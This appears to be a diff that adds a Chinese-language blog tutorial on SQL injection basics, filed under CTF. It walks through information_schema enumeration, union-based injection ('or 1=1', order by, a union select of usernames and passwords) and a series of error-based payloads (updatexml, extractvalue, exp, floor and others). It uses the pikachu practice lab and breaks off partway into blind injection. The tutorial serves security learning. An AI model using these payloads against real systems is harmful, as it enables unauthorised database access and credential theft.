@@ -1,0 +1,1323 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/dragon.ico?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/dragon.ico?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/dragon_16.ico?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="sql注入," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="SQL注入原理：SQL注入漏洞主要形成的原因是在数据交互中，前端的数据传入到后台处理时，没有做严格的判断，导致其传入的“数据”拼接到SQL语句中后，被当作SQL语句的一部分执行。 1、库、表、列库，即数据库，其中存放着数据表，使用 “show databases”语句可以查询后台所有数据库的名称。  其中 information_schema是一个存放有重要信息的数据库，如：   数据库包含数据表">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQL注入【基础】">
+<meta property="og:url" content="http://example.com/2021/04/30/SQL%E6%B3%A8%E5%85%A5%E3%80%90%E5%9F%BA%E7%A1%80%E3%80%91/index.html">
+<meta property="og:site_name" content="zhe&#39;s blog">
+<meta property="og:description" content="SQL注入原理：SQL注入漏洞主要形成的原因是在数据交互中，前端的数据传入到后台处理时，没有做严格的判断，导致其传入的“数据”拼接到SQL语句中后，被当作SQL语句的一部分执行。 1、库、表、列库，即数据库，其中存放着数据表，使用 “show databases”语句可以查询后台所有数据库的名称。  其中 information_schema是一个存放有重要信息的数据库，如：   数据库包含数据表">
+<meta property="og:locale">
+<meta property="og:image" content="https://i.loli.net/2021/01/18/TOBDlZW2eifyaUI.png">
+<meta property="og:image" content="https://i.loli.net/2020/11/09/5m3CYo68JSX1Kr2.png">
+<meta property="og:image" content="https://i.loli.net/2021/01/20/CutNSPlvdp78Whi.png">
+<meta property="og:image" content="https://i.loli.net/2021/01/20/p9I2JhEstqCBGH3.png">
+<meta property="og:image" content="https://i.loli.net/2021/02/24/EY1caHIVih6RnPr.png">
+<meta property="og:image" content="https://i.loli.net/2021/02/24/wt4mVcWd3y6Qlx2.png">
+<meta property="og:image" content="https://i.loli.net/2021/02/24/5za2bMyrXTYHQtq.png">
+<meta property="og:image" content="https://i.loli.net/2021/02/24/kAXutZziS9bwDYa.png">
+<meta property="og:image" content="https://i.loli.net/2021/02/24/A7PVDJmKcxEaFGb.png">
+<meta property="article:published_time" content="2021-04-30T13:38:00.000Z">
+<meta property="article:modified_time" content="2021-04-30T13:45:26.621Z">
+<meta property="article:author" content="zhe">
+<meta property="article:tag" content="sql注入">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2021/01/18/TOBDlZW2eifyaUI.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"right","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://example.com/2021/04/30/SQL注入【基础】/"/>
+
+
+
+
+
+  <title>SQL注入【基础】 | zhe's blog</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-right page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">zhe's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">nice 2 meet u</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/04/30/SQL%E6%B3%A8%E5%85%A5%E3%80%90%E5%9F%BA%E7%A1%80%E3%80%91/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="zhe's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">SQL注入【基础】</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2021-04-30T21:38:00+08:00">
+                2021-04-30
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/ctf/" itemprop="url" rel="index">
+                    <span itemprop="name">ctf</span>
+                  </a>
+                </span>
+
+                
+                
+                  ， 
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/ctf/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" itemprop="url" rel="index">
+                    <span itemprop="name">基础知识</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><p>原理：SQL注入漏洞主要形成的原因是在数据交互中，前端的数据传入到后台处理时，没有做严格的判断，导致其传入的“数据”拼接到SQL语句中后，被当作SQL语句的一部分执行。</p>
+<h2 id="1、库、表、列"><a href="#1、库、表、列" class="headerlink" title="1、库、表、列"></a>1、库、表、列</h2><p>库，即数据库，其中存放着数据表，使用 “show databases”语句可以查询后台所有数据库的名称。</p>
+<p><img src="https://i.loli.net/2021/01/18/TOBDlZW2eifyaUI.png" alt="image-20201109201621667"></p>
+<p>其中 information_schema是一个存放有重要信息的数据库，如：</p>
+<img src="https://i.loli.net/2020/11/09/5m3CYo68JSX1Kr2.png" alt="image-20201109202953795" style="zoom:33%;" />
+
+<p>数据库包含数据表，上图中每一行所显示的都是数据表的表名，其中值得关注的是 “tables” 与 “columns”</p>
+<p><strong>information_schema.tables中包含着整个库中的所有的表名</strong></p>
+<p>其中需要我们注意的有 “table_schema” “table_name”两列，其分别代表着我们想查找的表所在的数据库名及其表名。</p>
+<p><strong>information_schema.columns中包含着整个库中的所有表中的所有的列名</strong></p>
+<h2 id="2、使用sql语句进行数据查询的流程"><a href="#2、使用sql语句进行数据查询的流程" class="headerlink" title="2、使用sql语句进行数据查询的流程"></a>2、使用sql语句进行数据查询的流程</h2><h3 id="1、首先确定数据库的相关信息"><a href="#1、首先确定数据库的相关信息" class="headerlink" title="1、首先确定数据库的相关信息"></a>1、首先确定数据库的相关信息</h3><h4 id="（1）确定数据库名"><a href="#（1）确定数据库名" class="headerlink" title="（1）确定数据库名"></a>（1）确定数据库名</h4><p>首先介绍database()函数，该函数能够返回目前所在（所使用）的数据库名，例如：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; use test;</span><br><span class="line">Database changed</span><br><span class="line">mysql&gt; select database();</span><br><span class="line">+------------+</span><br><span class="line">| database() |</span><br><span class="line">+------------+</span><br><span class="line">| test       |</span><br><span class="line">+------------+</span><br></pre></td></tr></table></figure>
+
+<p>使用select函数（用于从数据库中选取数据结果被存储在一个结果表中，称为结果集）可以输出该函数的返回值（数据库名）</p>
+<h4 id="（2）确定数据表名"><a href="#（2）确定数据表名" class="headerlink" title="（2）确定数据表名"></a>（2）确定数据表名</h4><p>如上方所述，information_schema.tables表中的table_schema列存放着所有数据表对应的数据库名，table_name列存放着所有的数据表名，这时候只需要查询table_schema为database()的table_name数据结果，便可以知道目前所在的数据库中所有的数据表名</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select table_name from information_schema.tables where table_schema&#x3D;database();</span><br><span class="line">+------------+</span><br><span class="line">| table_name |</span><br><span class="line">+------------+</span><br><span class="line">| httpinfo   |</span><br><span class="line">| member     |</span><br><span class="line">| message    |</span><br><span class="line">| users      |</span><br><span class="line">| xssblind   |</span><br><span class="line">+------------+</span><br></pre></td></tr></table></figure>
+
+<h4 id="（3）确定数据表中的列名"><a href="#（3）确定数据表中的列名" class="headerlink" title="（3）确定数据表中的列名"></a>（3）确定数据表中的列名</h4><p>information_schema.columns表中的table_name列存放着所有的列所在的数据表名，column_name列存放着所有的列的列名，这时候只需要查询table_name为在上一步中得到的表名信息中的某个表的表名的column_name数据结果，便可以知道该表中的所有列名</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select column_name from information_schema.columns where table_name&#x3D;&#39;users&#39;;</span><br><span class="line">+-------------+</span><br><span class="line">| column_name |</span><br><span class="line">+-------------+</span><br><span class="line">| id          |</span><br><span class="line">| username    |</span><br><span class="line">| password    |</span><br><span class="line">| level       |</span><br><span class="line">+-------------+</span><br></pre></td></tr></table></figure>
+
+<p>（注意表名，如’users’带单引号）</p>
+<h3 id="2、查询目标信息"><a href="#2、查询目标信息" class="headerlink" title="2、查询目标信息"></a>2、查询目标信息</h3><h4 id="（1）查询目标列的所有数据"><a href="#（1）查询目标列的所有数据" class="headerlink" title="（1）查询目标列的所有数据"></a>（1）查询目标列的所有数据</h4><p>可以使用select函数：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select (列名) from (表名);</span><br></pre></td></tr></table></figure>
+
+<p>其中列名可以有多个，使用逗号连接，表名只能有一个</p>
+<h4 id="（2）查询目标列的目标数据"><a href="#（2）查询目标列的目标数据" class="headerlink" title="（2）查询目标列的目标数据"></a>（2）查询目标列的目标数据</h4><p>可以使用select函数：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select (被查询列名) from (表名) where (指定列名&#x3D;xx);</span><br></pre></td></tr></table></figure>
+
+<h2 id="3、联合注入"><a href="#3、联合注入" class="headerlink" title="3、联合注入"></a>3、联合注入</h2><p>联合注入的基本思路是，通过页面后端自带的MySQL的查询语句来进行注入，通过构成闭合来查询其他的内容</p>
+<h3 id="（1）万能钥匙"><a href="#（1）万能钥匙" class="headerlink" title="（1）万能钥匙"></a>（1）万能钥匙</h3><p>以下是一个基本的select查询语句，用于实现输入id查询用户的用户名：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select username from users where id&#x3D;xx;</span><br></pre></td></tr></table></figure>
+
+<p>其中xx为用户在页面所输入的payload，传至后端与MySQL语句相拼接，进行查询操作，如果我们在payload中动一些手脚，比如，构造闭合之后在后方加上</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">or 1&#x3D;1</span><br></pre></td></tr></table></figure>
+
+<p>并且将后方的额外语句注释掉之后，将可以查询出user表中username列的所有数据，故称万能钥匙</p>
+<h3 id="（2）union联合查询"><a href="#（2）union联合查询" class="headerlink" title="（2）union联合查询"></a>（2）union联合查询</h3><p>以上的万能钥匙只能遍历出原来列中的所有内容，如果需要查询其他列中的内容，就必须使用union构成联合查询语句，构造闭合之后在后方加上：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select (被查询列名) from (表名) where (指定列名&#x3D;xx)</span><br></pre></td></tr></table></figure>
+
+<p>其中where语句可以省略，并且后方需要加上注释符号</p>
+<p>值得重点注意的地方是，被查询列名的数量必须与union前的主查询语句中的被查询列名的数量一致，不够的用1进行补齐，此时问题在于，如何确定主查询语句中查询对象的数量？</p>
+<h4 id="order-by语句确定查询对象的数量"><a href="#order-by语句确定查询对象的数量" class="headerlink" title="order by语句确定查询对象的数量"></a>order by语句确定查询对象的数量</h4><p>使用order by语句，即在原查询语句构造闭合之后，加上：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">order by x</span><br></pre></td></tr></table></figure>
+
+<p>并且将后方进行注释，x从1开始，意为对第x列进行排序，当x增加到大于主查询语句中所查询的列的数量时，便会报错 Unknown column ‘x’ in ‘order clause’ 此时便可以确定原查询语句中查询对象的数量</p>
+<p>接下来介绍一个实用函数：</p>
+<h4 id="group-concat"><a href="#group-concat" class="headerlink" title="group_concat()"></a>group_concat()</h4><p>group_concat()函数能够将多行记录进行连接并且使用逗号进行分割，例如：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select 1,table_name from information_schema.tables where table_schema&#x3D;database()#</span><br></pre></td></tr></table></figure>
+
+<p>以上语句的查询结果为：</p>
+<img src="https://i.loli.net/2021/01/20/CutNSPlvdp78Whi.png" alt="image-20210120210710205" style="zoom:67%;" />
+
+<p>而如果改为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select 1,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()#</span><br></pre></td></tr></table></figure>
+
+<p>则以上语句的查询结果为：</p>
+<img src="https://i.loli.net/2021/01/20/p9I2JhEstqCBGH3.png" alt="image-20210120210833498" style="zoom:67%;" />
+
+<h4 id="一次完整的联合查询注入"><a href="#一次完整的联合查询注入" class="headerlink" title="一次完整的联合查询注入"></a>一次完整的联合查询注入</h4><p>（1）首先确定主查询语句的查询的列名数量为2：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">order by 2#</span><br></pre></td></tr></table></figure>
+
+<p>（2）确定所在的库中的数据表的名称：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select 1,table_name from information_schema.tables where table_schema&#x3D;database()#</span><br></pre></td></tr></table></figure>
+
+<p>（3）确定列名</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select 1,column_name from information_schema.columns where table_name&#x3D;&#39;users&#39;#</span><br></pre></td></tr></table></figure>
+
+<p>（4）查询密码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select username,password from users#</span><br></pre></td></tr></table></figure>
+
+<h2 id="4、报错注入"><a href="#4、报错注入" class="headerlink" title="4、报错注入"></a>4、报错注入</h2><p>正常用户访问服务器发送id信息返回正确的id数据。报错注入是想办法构造语句，让错误信息中可以显示数据库的内容，如果能让错误信息中返回数据库中的内容，即实现SQL注入</p>
+<p>最经典的报错注入：基于updatexml()函数的注入：</p>
+<h3 id="（1）updatexml-函数"><a href="#（1）updatexml-函数" class="headerlink" title="（1）updatexml()函数"></a>（1）updatexml()函数</h3><p>该函数的作用是：改变（查找并替换）XML文档中符合条件的节点的值，其中包含三个参数：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">updatexml(xml_document,XPathstring,new_value)</span><br></pre></td></tr></table></figure>
+
+<p>第一个参数：fiedname是String格式，为表中的字段名</p>
+<p>第二个参数：XPathstring（XPath格式的字符串）</p>
+<p>第三个参数：new_value（用于替换查找到的符合条件的节点的值）</p>
+<p>其中XPath定位必须是有效的，否则会发生报错，于是我们可以在第二个参数之中填入所需的语句，后台将对该语句进行解析并把运行结果返回在报错信息中，这就是报错注入。</p>
+<h3 id="（2）concat-函数"><a href="#（2）concat-函数" class="headerlink" title="（2）concat()函数"></a>（2）concat()函数</h3><p>updatexml()函数的报错内容需要经过处理才能被完整地输出出来，否则会把一部分内容吃掉，所以必须使用concat()函数，</p>
+<p>该函数的作用是，将传入的两个字符串进行拼接，其中如果是sql语句作为参数，concat()函数会将这个语句的表达结果作为字符串然后进行拼接操作，最后输出结果为一个字符串，这样便可以传入updatexml()函数中。</p>
+<h3 id="（3）进行updatexml注入"><a href="#（3）进行updatexml注入" class="headerlink" title="（3）进行updatexml注入"></a>（3）进行updatexml注入</h3><p>在构造闭合之后，在后方加上以下语句：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">- updatexml(1,concat(0x7e,(所要查询的语句)),0)#</span><br></pre></td></tr></table></figure>
+
+<p>最前面的减号用在构造闭合之后进行两个函数的连接，最后的#号用于构造闭合，而0x7e所代表的便是字符 “~”（也可以换用其他字符）</p>
+<p>完整的操作流程：</p>
+<p>（1）确定数据库中所有数据表名</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">- updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database())),0)#</span><br></pre></td></tr></table></figure>
+
+<p>（2）确定数据表中所有列名</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">- updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39;)),0)#</span><br></pre></td></tr></table></figure>
+
+<p>（3）输出id 账号 以及 密码</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">-</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> group_concat(id) <span class="keyword">from</span> users)),<span class="number">0</span>)#</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">-</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> group_concat(username) <span class="keyword">from</span> users)),<span class="number">0</span>)#</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">-</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> group_concat(password) <span class="keyword">from</span> users)),<span class="number">0</span>)#</span><br></pre></td></tr></table></figure>
+
+<h3 id="（4）limit语句"><a href="#（4）limit语句" class="headerlink" title="（4）limit语句"></a>（4）limit语句</h3><p>当输出结果有多行时，一般想到使用group_concat语句，但是如果该语句被过滤，可以使用limit语句进行替代，比如：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">-</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;pikachu&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>)),<span class="number">0</span>)#</span><br></pre></td></tr></table></figure>
+
+<p>以上将会输出列中第一行的结果，而如果将 “limit 0,1” 改为 “limit 1,1” ，将会输出第二行的结果</p>
+<h3 id="（5）substr-函数输出长字符结果"><a href="#（5）substr-函数输出长字符结果" class="headerlink" title="（5）substr()函数输出长字符结果"></a>（5）substr()函数输出长字符结果</h3><p>如果输出结果太长，将无法在报错语句中被完整地输出出来，这时可以使用substr()函数将结果进行分节输出，这个函数的用法为：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">substr(str,a,b)</span><br></pre></td></tr></table></figure>
+
+<p>其中str为需要进行截取的字符串名，a, b为整数，表示从a位置开始，截取b个字符，返回截取后的字符串。</p>
+<p>在语句中使用的实例：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">- updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,substr((select group_concat(password) <span class="keyword">from</span> users),<span class="number">10</span>,<span class="number">10</span>)),<span class="number">0</span>)<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<p>可以将结果一截截地输出</p>
+<h3 id="（6）其他的一些报错注入语句"><a href="#（6）其他的一些报错注入语句" class="headerlink" title="（6）其他的一些报错注入语句"></a>（6）其他的一些报错注入语句</h3><h4 id="基于extractvalue-函数的报错注入"><a href="#基于extractvalue-函数的报错注入" class="headerlink" title="基于extractvalue()函数的报错注入"></a>基于extractvalue()函数的报错注入</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-extractvalue(1,concat(0x7e,(所要查询的语句),0x7e))#</span><br></pre></td></tr></table></figure>
+
+<h4 id="基于geometrycollection-函数的报错注入"><a href="#基于geometrycollection-函数的报错注入" class="headerlink" title="基于geometrycollection()函数的报错注入"></a>基于geometrycollection()函数的报错注入</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-geometrycollection((select * from(select * from(所要查询的语句)a)b))#</span><br></pre></td></tr></table></figure>
+
+<h4 id="基于multipoint-函数的报错注入"><a href="#基于multipoint-函数的报错注入" class="headerlink" title="基于multipoint()函数的报错注入"></a>基于multipoint()函数的报错注入</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-multipoint((select * from(select * from(所要查询的语句)a)b))#</span><br></pre></td></tr></table></figure>
+
+<h4 id="基于polygon-函数的报错注入"><a href="#基于polygon-函数的报错注入" class="headerlink" title="基于polygon()函数的报错注入"></a>基于polygon()函数的报错注入</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">polygon((select * from(select * from(所要查询的语句)a)b))#</span><br></pre></td></tr></table></figure>
+
+<h4 id="基于multipolygon-函数的报错注入"><a href="#基于multipolygon-函数的报错注入" class="headerlink" title="基于multipolygon()函数的报错注入"></a>基于multipolygon()函数的报错注入</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-multipolygon((select * from(select * from(所要查询的语句)a)b))#</span><br></pre></td></tr></table></figure>
+
+<h4 id="基于linestring-函数的报错注入"><a href="#基于linestring-函数的报错注入" class="headerlink" title="基于linestring()函数的报错注入"></a>基于linestring()函数的报错注入</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-linestring((select * from(select * from(所要查询的语句)a)b))#</span><br></pre></td></tr></table></figure>
+
+<h4 id="基于multilinestring-函数的报错注入"><a href="#基于multilinestring-函数的报错注入" class="headerlink" title="基于multilinestring()函数的报错注入"></a>基于multilinestring()函数的报错注入</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-multilinestring((select * from(select * from(所要查询的语句)a)b))#</span><br></pre></td></tr></table></figure>
+
+<h4 id="基于exp-函数的报错注入"><a href="#基于exp-函数的报错注入" class="headerlink" title="基于exp()函数的报错注入"></a>基于exp()函数的报错注入</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-exp(~(select * from(所要查询的语句)a))#</span><br></pre></td></tr></table></figure>
+
+<h4 id="基于floor-函数的报错注入"><a href="#基于floor-函数的报错注入" class="headerlink" title="基于floor()函数的报错注入"></a>基于floor()函数的报错注入</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-(select 1 from select count(*),concat())</span><br></pre></td></tr></table></figure>
+
+<p>以上的数中报错注入方式都可以按照sql注入的基本流程进行</p>
+<h2 id="5、盲注"><a href="#5、盲注" class="headerlink" title="5、盲注"></a>5、盲注</h2><h3 id="基于boolean的盲注"><a href="#基于boolean的盲注" class="headerlink" title="基于boolean的盲注"></a>基于boolean的盲注</h3><p>有时候网页会对返回的内容进行高强度过滤，只有两种返回值，我们可以称之为真和假，比如，在pikachu靶场中，当语句的逻辑值为真时，返回：</p>
+<img src="https://i.loli.net/2021/02/24/EY1caHIVih6RnPr.png" alt="image-20210224221114926" style="zoom:67%;" />
+
+<p>当语句的逻辑值为假，返回：</p>
+<img src="https://i.loli.net/2021/02/24/wt4mVcWd3y6Qlx2.png" alt="image-20210224221354197" style="zoom:67%;" />
+
+<p>这时候我们查看页面源代码，发现不同之处在于：</p>
+<p><img src="https://i.loli.net/2021/02/24/5za2bMyrXTYHQtq.png" alt="image-20210224221459645"></p>
+<p>于是我们尝试对回显语句进行抓包：</p>
